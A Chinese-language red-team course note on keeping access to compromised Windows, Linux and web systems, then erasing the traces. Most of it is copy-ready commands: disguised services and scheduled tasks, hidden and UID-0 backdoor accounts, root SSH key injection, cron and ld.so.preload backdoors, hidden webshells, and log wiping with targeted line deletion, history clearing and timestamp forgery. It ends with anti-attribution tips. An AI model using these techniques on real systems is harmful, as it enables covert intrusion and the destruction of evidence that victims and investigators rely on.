# 权限维持、痕迹清理与撤收

## 1. 知识点讲解

持久化的目标不是「藏得最深」，而是「断线后能按预期回来，且撤离时能删干净」。原则：多点异构（不同机制至少 2 个）、低交互（不常上线）、可自毁。

## 2. Windows 持久化手法

| 层级 | 手法 | 命令/位置 | 备注 |
| --- | --- | --- | --- |
| 用户态 | Run 键 | `reg add HKCU\...\Run /v upd /t REG_SZ /d "C:\Users\Public\x.exe"` | 登录触发，权限低 |
| 系统态 | 服务 | `sc create upd binpath= "C:\x.exe" start= auto` | 伪装服务名/描述 |
| 系统态 | 计划任务 | `schtasks /create /tn "WindowsUpdate" /tr C:\x.exe /sc onlogon /ru SYSTEM` | 最常用 |
| 系统态 | WMI 事件订阅 | mof / powershell Register-WmiEvent | 无文件，较隐蔽 |
| 账户层 | 影子账户 | `net user help$ Pass /add` + 注册表克隆管理员 RID | 配合 RDP |
| 账户层 | DSRM 后门 | DC 上把 DSRM 管理员哈希同步为已知账户 → 远程 admin$ 直通 DC | 域级 |
| 票据层 | 黄金票据 | krbtgt 伪造 TGT（05-01） | 域级终极后门 |
| 启动层 | 启动文件夹 | `shell:startup` | 用户登录触发 |
| 镜像劫持 | IFEO/Accessibility | sethc.exe 粘滞键替换（需授权演练内使用） | 登录界面 SYSTEM |

## 3. Linux 持久化手法

```bash
# SSH 密钥（首选）
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
# 后门账户（UID 0）
useradd -o -u 0 -g 0 -M -s /bin/bash hider && echo 'hider:Pass' | chpasswd
# cron
echo "* * * * * root /tmp/.x" >> /etc/crontab
# systemd 服务
# /etc/systemd/system/updater.service → systemctl enable updater
# PAM 后门 / 动态库劫持（高阶）：/etc/ld.so.preload 写入恶意 so（注意权限与痕迹）
# 公钥私钥分离的反向隧道守护：autossh -R
```

## 4. Web 层持久化

- 内存马（Java Filter/Servlet）：无文件，重启失效——配合双通道。
- 混淆免杀马藏深目录：`/static/images/.banner.jsp`；加时间戳伪装（见下）。
- 配置文件后门：web.config/.htaccess 预留解析触发点。

## 5. 痕迹清理

### Linux
```bash
# 日志
cat /dev/null > /var/log/auth.log      # 不要 rm（留空洞更可疑），置空或精准删行
sed -i '/攻击机IP/d' /var/log/secure
history -c && history -w; export HISTFILE=/dev/null
# 时间戳伪装
touch -r /bin/ls backdoor              # 参照正常文件
# 进程伪装：改名、PR_SET_NAME
```

### Windows
```powershell
# 事件日志（慎用，整清=自首信号；优先精准删）
wevtutil cl Security                    # 粗暴全清（演练收尾用）
# 精准删除：phant0m（挂起日志线程）、EventCleaner 按事件 ID 删
# 时间戳：timestomp（meterpreter）/ Set-Mace 改 MACE
# 登录类型自查：4624(3=网络,10=RDP) 对应清理范围
```

### Web/中间件
- access.log 按源 IP/UA 精准删行；注意 CDN/前置日志另有副本。
- 删马的同时删上传目录的元数据记录（数据库 attachment 表）。

## 6. 反溯源要点

- 攻击源全程走「VPS→重定向器」双层，C2 真实 IP 永不直连目标。
- 工具上线前过一遍 strings/元数据，去掉个人 ID、默认注释。
- 文档/报告产出前清理个人信息与 AI 特征（团队既有规范）。
- 不在目标环境留「签名式」文件名（msf、beacon、kali 等字样）。
